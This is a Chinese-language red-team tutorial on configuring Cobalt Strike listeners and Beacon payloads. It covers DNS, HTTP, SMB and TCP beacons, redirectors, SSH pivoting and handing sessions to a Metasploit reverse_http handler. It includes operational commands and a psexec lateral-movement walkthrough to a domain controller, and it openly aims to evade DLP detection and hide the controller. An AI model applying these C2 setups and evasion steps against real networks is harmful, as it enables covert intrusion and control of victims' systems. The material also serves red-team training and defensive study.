> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/FhLyZcBbWVAyNrVl3S9rwQ)

一个监听器既是一个 payload 的配置信息，同时又是 Cobalt Strike 起一个服务器来接收来自这个 payload 的连接的指示。一个监听器由用户定义的名称、payload 类型和几个特定于 payload 的选项组成。  

当我们创建一个监听器，确保你给他一个好记的名称。在 Cobalt Strike 的命令和工作流程中你需要使用此名称来引用此监听器。要编辑监听器，选中一个监听器，然后按 Edit 。要移除一个监听器，选中该监听器，然后按 Remove 。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDB1qghCjSZ9iaUreF1z2c5FyqeQf4Y1Qmozbw1U2eoRcrjvnzs97w6Tgu4ZABpF8NsZrOmNCbLeLuA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDB1qghCjSZ9iaUreF1z2c5FyaYoqu22Ta2c93Pzl752JMswVhnlokpP6a299SWrc5InXSaG9C5Mibibw/640?wx_fmt=png)

有效负载字段是您要配置的有效负载 / 侦听器的类型：

```
信标DNS
信标HTTP和HTTPS
信标SMB
信标TCP
外部C2
外部HTTP和HTTPS（请参见下文）
```

要编辑监听器，请突出显示一个监听器，然后按 Edit / 编辑。

要删除监听器，请突出显示该监听器，然后按 “Remove / 删除”。

1. 枢轴图

数据透视图以自然方式显示我们的信标链。

转到 Cobalt Strike- > 可视化 -> 数据透视图以启用此视图。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDB1qghCjSZ9iaUreF1z2c5FytuRNeRWIv7bRibaaia2twiatBNt8ybwhJ6ZV7MiaJzXAnKRow5PoQrV6ng/640?wx_fmt=jpeg)

每个信标会话都有一个图标。与会话表一样：每个主机的图标表示其操作系统。如果带有闪电的图标为红色，则指示信标正在以管理员权限运行。较深的图标表示信标会话被要求退出，并且它确认了此命令。

防火墙图标表示信标有效载荷的出口。绿点划线表示使用信标 HTTP 或 HTTPS 连接离开网络。黄色虚线表示使用 DNS 离开网络。

将一个信标会话连接到另一个信标会话的箭头表示两个信标之间的链接。Cobalt Strike 的信标使用 Windows 命名管道和 TCP 套接字以对等方式控制信标。橙色箭头是命名的管道通道。SSH 会话也使用橙色箭头。蓝色箭头是 TCP 套接字通道。红色（命名管道）或紫色（TCP）箭头表示信标链接已断开。

单击信标将其选中。可以通过在所需主机上单击并拖动一个框来选择多个信标。按 Ctrl 和 Shift，然后单击以选择或取消选择单个信标。

右键单击 “信标” 以显示一个菜单，其中包含可用的开发后选项。

右键单击没有选择信标的数据透视图，以配置该图的布局。

2. Cobalt Strike 的 Beacon Payload

Cobalt Strike 的 Beacon Payload 最常见的情况是，你需要为 Cobalt Strike 的 Beacon payload 配置监听器。Beacon 是 Cobalt Strike 的 payload，用于建模高级攻击者。

使用 Beacon 来通过 HTTP，HTTPS 或 DNS 出口网络。我们也可以通过控制经由命名管道和 TCP sockets 的对等（peer-to-peer）Beacon 从而限制出口网络，只允许部分主机直接回连。

 Beacon 很灵活，支持异步通信模式和交互式通信模式。异步通信效率缓慢：Beacon 会回连团队服务 器、下载其任务，然后休眠。

交互式通信是实时发生的。 

Beacon 的网络流量指标具有拓展性。

可以使用 Cobalt Strike 的可拓展的 C2 语言来重新定义 Beacon 的通信。这允许你掩盖 Beacon 行动，比如使其流量看起来像其他的恶意软件，又或者将其流量掺入作 为合法流量。

要注意的是：在 Cobalt Strike 4.0 及以后的版本中，后渗透和横向移动的行为避开了 stager 并选择去尽可能的投递 一个完整的 payload。这里不多描述。

DNS 信标

DNS 信标是 Cobalt Strike 最棒的功能。此有效负载使用 DNS 请求将我们的信标返回给我们。这些 DNS 请求是针对我们的 Cobalt Strike 团队服务器具有权威性的域的查找。DNS 响应告诉 Beacon 睡眠或连接到我们以下载任务。DNS 响应还将告诉 Beacon 如何从团队服务器下载任务。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDB1qghCjSZ9iaUreF1z2c5FyicGxYicHg3XwrfhX3n6iacGFUyrYgn0hEWMHHe9TROJySWrHQibdUoYb7w/640?wx_fmt=png)

要注意：在 Cobalt Strike 4.0 和更高版本中，DNS 信标是仅 DNS 的有效负载。此有效负载中没有 HTTP 通信模式。

DNS Beacon 可以通过 DNS TXT 记录、DNS AAAA 记录或 DNS A 记录下载任务。当其在目标上，此 payload 有在这些数据通道之间切换的灵活性。

```
使用 Beacon 的模式命令来改变当前 Beacon 的 数据通道。 

mode dns       是 DNS A 记录数据通道；
mode dns6      是 DNS AAAA 记录数据通道；
mode dns-txt   是 DNS TXT 记录数据通道。DNS TXT 记录是默认的数据通道。
```

请注意，只有在有可用任务时，DNS Beacon 才能 check in。使用 checkin 命令来请求 DNS Beacon 在下次回连的时候 check in。请注意，DNS Beacon 直到有可用任务时才会 check in 使用 checkin 命令要求 DNS Beacon 在 下次回连的时候 check in。  

我们都知道 Beacon 会心跳回连，

那么 checkin 也就是 DNS 服务器发送一 个 xxx.xxx.com 的 DNS 请求，不会进行任务数据通讯，

这个时候使用 Beacon 的模式命令来改变当前 Beacon 的数据通道，然后执行 checkin 就有数据回来了。

如果执行一个其他命令，比如 whoami ，它首先会自动 check in 再执行其他命令，如果只输入 checkin 命 令，就只返回来元数据。

简单来说：check in，指的是 Beacon 回连主机，回传受害系统的元数据，准 备好进行任务数据通讯的状态。

实际意义：红蓝对抗中，可以通过 DNS 的方式通信，流量更加隐秘，躲避 agent/DLP 的检测，实现相对隐秘的渗透方式。

环境需要：CobaltStrike + 域名

**1 域名解析配置**  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDB1qghCjSZ9iaUreF1z2c5Fy3xhbImRTxtbhoOZurIGkMB5k3cKfFic4tDDvXjr8fSKsgXI5w5U9ibUg/640?wx_fmt=png)  
解析过程如下：  

```
第一步：ns1.xxxxx.com-----ns------>ns.xxxxxx.com
第二部：ns.xxxxx.com------A------->VPS地址
```

2 Cobat Strike 配置  
注意：VPS 防火墙 53 端口一定要开启

3 监听器设置 

要创建一个 DNS Beacon 监听器：通过 Cobalt Strike → Listeners ，点击 Add 按钮，然后选择 Beacon DNS 作为 payload 类型。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDB1qghCjSZ9iaUreF1z2c5Fyia1lngLxNXu1VXaRxpES7FhKGPVxDCM5F3Yx7SZbt1Dj3D1fc3eWoyA/640?wx_fmt=png)

我们可以使用【+】把一个或多个域添加到我们的 beacon 中，Cobalt Strike 团队服务器系统必须对我们指定的域具有权威性。

创建一个 DNS A 记录并将其指向我们的 Cobalt Strike 团队服务器。使用 DNS NS 记录将多个域或子域委派给 Cobalt Strike 团队服务器的 A 记录。

4 测试 DNS 配置

打开终端并输入 nslookup jibberish.beacon domain。

如果收到 0.0.0.0 的 A 记录答复，则说明 DNS 已正确设置。

如果未收到答复，则说明 DNS 配置不正确，DNS 信标将无法与我们通信。

5 注意

如果我们的 CS 在 NAT 设备后面，请确保将公用 IP 地址用于 NS 记录，并将防火墙设置为将端口 53 上的 UDP 流量转发到系统。Cobalt Strike 包括用于控制信标的 DNS 服务器。

当启动一个 DNS Beacon 的时候，就相当于 Cobalt Strike 把团队服务器作为了一个 DNS 的解析 服务器。

当受害主机进行 DNS 请求的时候，就需要给 53 端口发包。

如果团队服务器在内网中，就需要把公网 IP 的 53 端口和内网 IP 做一个端口映射，

相当于把外网的 53 端口映射到内网的团队服 务器上去

6 流量分析

抓包：  
执行 whoami  
抓到流量  
看到 DNS 流量

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDB1qghCjSZ9iaUreF1z2c5Fyx3HX56BFkiczdTQ0icglqphnyRIkhqchyvNyv8K0gSNT8opjvK27oNvQ/640?wx_fmt=png)  

HTTP 和 HTTPS 信标

HTTP 和 HTTPS 信标通过 HTTP GET 请求下载任务。这些信标通过 HTTP POST 请求将数据发送回去。

我们可以通过 Malleable C2 来控制此有效负载中的行为和指标。

要建立 HTTP 或 HTTPS 信标侦听器，请转到 Cobalt Strike-> 侦听器。按添加。选择信标 HTTP 作为有效负载选项。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDB1qghCjSZ9iaUreF1z2c5FyHsic94Z8VtZI17tZUDXqBZQXrM1vgAJw4Ss3y1bBwzuD8JKdEeBL1vg/640?wx_fmt=png)

按 [+] 为 HTTP 信标添加一个或多个主机，以将其作为主目录。按 [-] 删除一个或多个主机。按 [X] 清除当前主机。如果您有多个主机，您仍然可以将逗号分隔的回调主机列表粘贴到此对话框中。

HTTP 主机（stager）字段控制 HTTP 驿站为 HTTP 信标主机。仅当您将此有效负载与需要显式暂存器的攻击配对时，才使用此值。

通过 Profile 字段，你可以选择一个 C2 拓展文件变体。通过一个 C2 文件变体，你可以在一个文件中指定多个配置文件的变量。使用变体文件之后，你设置的每个 HTTP 或 HTTPS 监听器会有不同的网络

流量指标。

HTTP Port(C2) 字段设置你的 HTTP Beacon 回连的端口。HTTP Port(Bind) 字段指定你的 HTTPBeacon payload web 服务器绑定的端口。如果你要设置端口弯曲重定向器（例如，接受来自 80 或 443 端口的连接但将连接路由到团队服务器开在另一个端口上的连接，这样的重定向器），那么这些选项会很有用。

如果 HTTP Host Header 值被指定了，会影响你的 HTTP stagers，并通过你的 HTTP 通信。这个选项使得通过 Cobalt Strike 利用域名前置变得更加容易。

按 “HTTP 代理” 字段旁边的... 以为此负载指定显式代理配置。

手动的 HTTP 代理设置

勾选 Ignore proxy settings;use direct connection （忽略代理设置；使用直连）来强制 Beacon 不通过代理尝试其 HTTP 和 HTTPS 请求。 

当你填写好代理配置之后，点击 Set 来更新 Beacon 对话框。

点击 Reset 可以把代理配置重置为默认 行为。 

注意：手动的代理设置仅影响 HTTP 和 HTTPS Beacon payload stage，不影响 payload stager。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDB1qghCjSZ9iaUreF1z2c5Fy2QIQCae9weiaiaJRLzzyPsR3F1JqeWlibPWAia0nvFlulSTiawR0Rf5cVpg/640?wx_fmt=png)

C2 Redirectors，就是在现有的 C2 上增加一个中转服务器，这个中转服务器起到功能和流量分离 的作用，C2 流量可以被中转到不同战术意义的服务器，比如打完就走的短期 C2、需要长期控制 驻留的 C2 和邮件钓鱼服务器等。

这个 C2 重定向器相当于位于团队服务器这个控制端和失陷主机之间的中转跳板。外界只能看到 重定向器（跳板），一旦重定向器暴露可以被随时抛弃，除非重定向器被反制，否则很难追踪到 背后真正的控制者。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDB1qghCjSZ9iaUreF1z2c5FyUS82bTCdpfEiaSMDGmnnD0RoX6JwOW3qEtYoOTsGtkdNLLxpkd3ROgw/640?wx_fmt=png)

Cobalt Strike 的监听器管理功能支持使用重定向器。当你设置一个 HTTP 或 HTTPS Beacon 监听器的 时候，简单的指定你的重定向器 IP （在 Host 字段填入）。Cobalt Strike 不会验证这个信息。如果你 提供的 host 不隶属于当前主机（不是团队服务器的 IP），那么 Cobalt Strike 就假设它是重定向器。一种把服务器转变为重定向器的简单方法是使用 socat。下面是一句 socat 语法，作用是：将 80 端口上的所有连接转发到位于 192.168.12.100 的团队服务器的 80 端口：

socat TCP4-LISTEN:80,fork TCP4:192.168.12.100:80

这里提几句：

使用 socat/iptable 的话流量只能全部转发到我们的 cs 服务器，一般在实战中我们

使用 Apache 重定向器作为中转服务器。

我们的 C2 域将指向 Apache 重定向器，它将执行流量过滤

例如：仅允许命令和控制（C2）流量到达我们的 Cobalt Strike 服务器，并将所有其他流量重定向到无害的网站

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDB1qghCjSZ9iaUreF1z2c5FyErcv3CVxhiaoO9jSRVYGOrSnQ6NHUBhhX8Tyfdia0ljwjBwAM8Gc0w9g/640?wx_fmt=png)

这里不多说

SMB 信标

SMB 信标使用命名管道通过父信标进行通信。这种对等通信与同一主机上的信标一起使用。它也可以在整个网络上运行。Windows 将命名管道通信封装在 SMB 协议中。因此，名称为 SMB Beacon。

要配置 SMB 信标有效负载，请转到 Cobalt Strike-> Listeners。按添加。选择信标 SMB 作为我们的有效负载选项。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDB1qghCjSZ9iaUreF1z2c5FyQQxZDpplGLZgf6XqJN5ianESOPpbFeJjbicdAy5OxIbk8Eqa72mfuvmw/640?wx_fmt=png)

与 SMB 信标关联的唯一选项是管道名称。

我们可以设置一个显式管道名或接受默认选项。

SMB 信标与 Cobalt Strike 中产生有效载荷的大多数动作兼容。

Cobalt Strike 后渗透和横向移动行为派生一个 payload，会尝试为我们承担对 SMB Beacon payload 的 控制。

如果我们手动的运行 SMB Beacon，你将需要从一个父 Beacon 链接到它。

链接和取消链接

从 Beacon 控制台，使用 link [host] [pipe] 来把当前的 Beacon 链接到一个等待连接的 SMB Beacon。当当前 Beacon check in，它的链接的对等 Beacon 也会 check in。

为了与正常流量融合，链接的 Beacon 使用 Windows 命名管道进行通信。这个流量被封装于 SMB 协 议中。

对于此方法有一些警告： 

```
1. 具有 SMB Beacon 的主机必须接受445端口上的连接。
2. 你只能链接由同一个 Cobalt Strike 实例管理的 Beacon。
 如果在你尝试去连接到一个 Beacon 之后得到一个 error 5（权限拒绝），可以尝试这样解决：窃取域 用户的令牌或使用 make_token DOMAIN\user password 来使用对于目标有效的凭据来填充你的当前 令牌，然后再次尝试去连接到 Beacon。
```

要销毁一个 Beacon 链接，在父会话或子会话中使用 unlink [ip address] [session PID] 。这个 [session PID] 参数是要取消链接的 Beacon 的进程 ID。

该值用于当有多个子 Beacon 时，指定一个特 定的 Beacon 来断开链接。当你对一个 SMB Beacon 取消了链接，它不会离开并消失。相反，它进入一种等待其他 Beacon 连接 的状态。你可以使用 link 命令来从将来的另一个 Beacon 恢复对 SMB Beacon 的控制。

实战手法

当我们拿下了一台边界服务器时想要横向移动时，我们可以利用 SMB beacon 来配合进行

1. 新建一个 SMB listener 并进行监听

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDB1qghCjSZ9iaUreF1z2c5FySG4MtG4BSanATaYAdMYNf40BNPxleVNsRoV8cBHSmZ0V2L2UOjO9LA/640?wx_fmt=png)

2. 选择目标利用 psexec 进行横向移动（具体手法看实际环境）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDB1qghCjSZ9iaUreF1z2c5FyNbISys609YicjJibyDLCW57xFJQ4um06jg3hOyjlxS3oFZzdzJl2htfg/640?wx_fmt=png)

3. 使用账号密码和 SMB 监听器

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDB1qghCjSZ9iaUreF1z2c5FyplfYUdoJBGHXDRMPOcU5lXUOYMCBKdPrw66yvibE122OAT3Jfxq2qNA/640?wx_fmt=png)

4. 选择会话。开始利用

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDB1qghCjSZ9iaUreF1z2c5FyejibRI6BGboC2caI9nxIbSVmG2It49sayamYsAIGF5hXlSBTPU0qoSA/640?wx_fmt=png)

5. 利用成功。我们可以看到：web 和 DC 中有一个 SMB 链接。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDB1qghCjSZ9iaUreF1z2c5FyREHvuteSRuvibf1OCribHBnEr7vcwTS0swgzfCsIeoHY3TwZKmbUsCYw/640?wx_fmt=jpeg)

TCP Beacon TCP Beacon 

使用一个 TCP socket 来通过一个父 Beacon 通信。这种对等通信对同一台主机上的 Beacon 和跨网络的 Beacon 都有效

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDB1qghCjSZ9iaUreF1z2c5Fy26ja4H5OVTw79atvyQPW7yBVHY9nCXAiaF2icic4Nia3TKUfbYJmOoseeQ/640?wx_fmt=png)

要配置一个 TCP Beacon payload，通过 Cobalt Strike → Listeners ，点击 Add 按钮。选择 Beacon TCP 作为你的 payload 选项。 

一个绑定的 payload 会等待来自它的控制器 （在此场景中，控制器是另一个 Beacon 会话）的连接。 

Port(C2) 选项控制 TCP Beacon 将等待连接 的端口。当它监听一个连接，勾选 Bind to localhost only 来使 TCP Beacon 绑定到 127.0.0.1。

 如果你为仅本地的行为使用 TCP Beacon，那么这是一个很好的选项。 

类似于 SMB Beacon，TCP Beacon 与 Cobalt Strike 中派生 payload 的大多数动作相兼容。

Cobalt Strike 后渗透和横向移动行为派生一个 payload，会尝试为你承担对 TCP Beacon payload 的控 制。

如果你手动的运行 TCP Beacon，你将需要从一个父 Beacon 链接到它

实战手法：跟 SMB beacon 差不多，但是流量没有 SMB 隐蔽。在实战中可以根据实际情况使用。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDB1qghCjSZ9iaUreF1z2c5Fy8V5l5icicAqicQMU4kqyWuMJu8dRpgRdia1QPfLRxVm4dtgZdLaYfg8uVw/640?wx_fmt=jpeg)

连接和取消链接 从 Beacon 控制台，使用 connect [ip address] [port] 来把当前的 Beacon 连接到一个等待连接 的 TCP Beacon。

当当前的会话 check in，它的链接的对等 Beacon 也会 check in。 

 要销毁一个 Beacon 链接，在父会话或子会话的控制台中使用 unlink [ip address] [session PID] 。以后，你可以从同一主机（或其他主机）重新连接到 TCP Beacon。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDB1qghCjSZ9iaUreF1z2c5Fyw5StGCqOrW5AcJacyeMEJC6x0YqRJAcNJ2DGV1xmO6ZQmTBS3nogrA/640?wx_fmt=jpeg)

3 SSH 会话

Cobalt Strike 使用内置的 SSH 客户端控制 UNIX 目标。

该 SSH 客户端接收任务并通过一个父 Beacon 路由其输出。 

使用 ssh [target] [user] [password] 命令从一个 Beacon 中启动 SSH 会话。

你也可以使用 sshkey [target] [user] [/path/to/key.pem] 命令以使用密钥进行身份验证。

 这些命令运行 Cobalt Strike 的 SSH 客户端。客户端会向父 Beacon 报告任何连接和身份验证问题。如果连接成功，你将在 Cobalt Strike 的显示中看到一个新会话。

这是一个 SSH 会话。右键单击此会话， 然后按 Interact 来打开 SSH 控制台。 

输入 help 以查看 SSH 会话支持的命令列表。输入 help 后 跟一个命令名称，以获取有关该命令的详细信息。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDB1qghCjSZ9iaUreF1z2c5FytLKpErlicmybq3JXNY0kyWqRyII9xKica75RtIQoQAG1Nq3skicFxpOTg/640?wx_fmt=png)

shell 命令将运行你提供的命令和参数。运行的命令在 Cobalt Strike 将命令置于后台之前可以锁定 SSH 会话长达 20 秒。Cobalt Strike 将在可用时报告这些长时间运行的命令的输出。 

使用 sudo [password] [command + arguments] 尝试通过 sudo 运行命令。这个别名要求目标的 sudo 接受 –S 标志。

cd 命令将更改 SSH 会话的当前工作目录。

pwd 命令报告当前的工作目录。

upload 命令会将文件上传到当前工作目录。

download 命令将下载文件。通过 download 命令下载 的文件可以通过 View → Downloads 查看。你也可以输入 downloads 来查看正在进行的文件下载。cancel 命令将取消正在进行的下载任务

SSH 会话可以控制 TCP Beacon。使用 connect 命令启动对一个等待连接的 TCP Beacon 的控制。使 用 unlink 断开一个 TCP Beacon 会话的连接。 

通过 [session] → Listeners → Pivot Listener… 来设置一个与此 SSH 会话绑定的 pivot 监听 器。

这将允许这个失陷的 UNIX 目标可以接收反向 TCP Beacon 会话。

此选项的前提是需要 SSH 守护程 序的 GatewayPorts 选项的值被设定为 yes 或 ClientSpecified 。

SOCKS Pivoting 和反向端口转发 使用 socks 命令在团队服务器上创建一个通过 SSH 会话转发流量的 SOCKS 服务器。rportfwd 命令 还将创建一个反向端口转发，用于路由通过 SSH 会话和你的 Beacon 链的流量。 

rportfwd 有一个警告：rportfwd 命令要求 SSH 守护程序绑定到所有接口（0.0.0.0）。SSH 守护程 序很可能会覆盖此设置，并强制端口绑定到 localhost。你需要将 SSH 守护程序的 GatewayPorts 选项 更改为 yes 或 ClientSpecified 。

外部 / Extermal C2（第三方命令和控制）

外部 C2 是一个规范，允许第三方程序充当 Cobalt Strike 的 Beacon 有效载荷的通信层。这些第三方程序连接到 Cobalt Strike，以读取目标帧，并使用以这种方式控制的有效负载的输出来写入帧。这些第三方程序使用外部 C2 服务器与 Cobalt Strike 团队服务器进行交互。

转到 Cobalt Strike-> Listeners，按 Add，然后选择 External C2 作为有效负载。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDB1qghCjSZ9iaUreF1z2c5FybPYpuzxiaBqh1iavDZ0iagXiaZcib1uxiazE3ibibaNUfErtLsG7RNGdqy8bGQ/640?wx_fmt=png)

外部 C2 接口有两个选项。端口（绑定）指定外部 C2 服务器等待连接的端口。选中仅绑定到本地主机，以使外部 C2 服务器仅本地主机。

外部 C2 侦听器与其他 Cobalt Strike 侦听器不同。您无法通过 Cobalt Strike 的后开采行动来针对这些目标。此选项只是为了方便站立接口本身。

要了解有关外置 C2 的更多信息，请访问此文档：https://www.cobaltstrike.com/help-externalc2

Foreign Listener

 Cobalt Strike 支持对外监听器的概念。这些是托管在 Metasploit 框架或其他 Cobalt Strike 实例的 x86 payload handler 的别名。要传递一个 Windows HTTPS Meterpreter 会话到一个使用 msfconsole 的朋友那里，建立一个 Foreign HTTPS payload 并将主机和端口的值指向它们的 handler。你可以在任何你想要使用 x86 Cobalt Strike 监听器 的地方使用 foreign listener（对外监听器）。

实战手法：

例如我们给一个会话 MSF：

在 MSF 中监听一个 http/https 的会话：

msf5 > use exploit/multi/handler

msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_http# msf 监听的地址，因为我的机器 msf 和 cs 都在同一个机器上所以 ip 相同

msf5 exploit(multi/handler) > set lhost 192.168.50.146

msf5 exploit(multi/handler) > set lport 1234

msf5 exploit(multi/handler) > run

然后在 CS 中

端口 / host 跟 MSF 中的一样就行

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDB1qghCjSZ9iaUreF1z2c5FytdOOzHOpa0ZUMGULlUIkDOgWYxeDkz3NAVd1KJRTLicicrIIj6H8ENQQ/640?wx_fmt=png)

CS 派生会话

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDB1qghCjSZ9iaUreF1z2c5FyFmavn5YWUWaj4N3QslP8Xsows5u4bRDibgey0dPhqbyFtcAicm0c9quw/640?wx_fmt=png)

那么 MSF 中就能看到一个 session 了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDB1qghCjSZ9iaUreF1z2c5FyTia1lEG0lzUibSnpdmeEQnyI7FHwdpz1tkcOlylC52mTnb2ibpXwJUX1g/640?wx_fmt=png)

基础设施整合 

Cobalt Strike 的分布式行动模型的基本思想是为你的每个行动阶段建立单独的团队服务器。

比如，将你 的后渗透基础设施和持久化基础设施分开。如果一个后渗透行为被发现，这个基础设施将被重建。一些行动阶段要求多个重定向器和通信通道选项。

我们可以将多个 HTTP、HTTPS 和 DNS 监听器绑定到一个单独的 Cobalt Strike 团队服务器。这些 payload 在它们的配置中也支持端口弯曲（port bending）。

这允许在你的重定向器和 C2 设置中使用 与你的通信通道（80，443 或 53）共同的端口，但是最好把这些监听器绑定到不同的端口以避免你的团 队服务器系统中发生端口冲突。 

为了使你的网络流量指标多样化，Cobalt Strike 的 C2 拓展文件可能包含多种变体。

变体是一种将当前文件的变量加到一个配置文件中的方法

当你定义每个 HTTP 或 HTTPS Beacon 监听器时，

你可以指定 一个配置文件变体。此外，你可以在一个团队服务器上定义多个 TCP 和 SMB Beacon，每一个都使用不同的管道和端口设 置。任一个来自同一团队服务器的出口 Beacon，一旦它们被部署在目标环境中，那么都可以控制任何 一个这些 TCP 和 SMB Beacon 的 payload。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDB1qghCjSZ9iaUreF1z2c5FymK1UqcDblEmjRelyMZtIU8MUpht1T8sundVbdTUsztMFk6lmMJcZJQ/640?wx_fmt=jpeg)

Payload 安全特性 

Cobalt Strike 采取措施保护 Beacon 的通信，确保 Beacon 只能接收来自其团队服务器的任务并且只能 将结果发送至其团队服务器。首次设置 Beacon payload 时，Cobalt Strike 会生成一个团队服务器专有的公钥 / 私钥对。团队服务器 的公钥会嵌入 Beacon 的 payload stage。Beacon 使用团队服务器的公钥来加密发送到团队服务器的 会话元数据。Beacon 必须在团队服务器可以发出任务和接收来自 Beacon 会话的输出之前持续发送会话元数据。此 元数据包含一个由 Beacon 生成的随机会话秘钥。团队服务器使用每个 Beacon 的会话秘钥来加密任务 并解密输出。每个 Beacon 都使用这种相同的方案来实现数据通道。当在混合 HTTP 和 DNS Beacon 中使用记录 （A、AAAA、TXT）数据通道时，你有和使用 HTTPS Beacon 同样的安全保护。请注意，当 Beacon 分阶段时，payload stager 因为其体积原因，没有这些内建的安全特性。

渗透测试 红队攻防 免杀 权限维持 等等技术 

及时分享最新漏洞复现以及 EXP 国内外最新技术分享!!!

进来一起学习吧

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDCu9vYaicsKXmibIlxHDeXmK8yoDsVrSMpI3RgS4JPtgGPdqXToibeNYGEMgk5WznIayx4hwMd8sVgJA/640?wx_fmt=jpeg)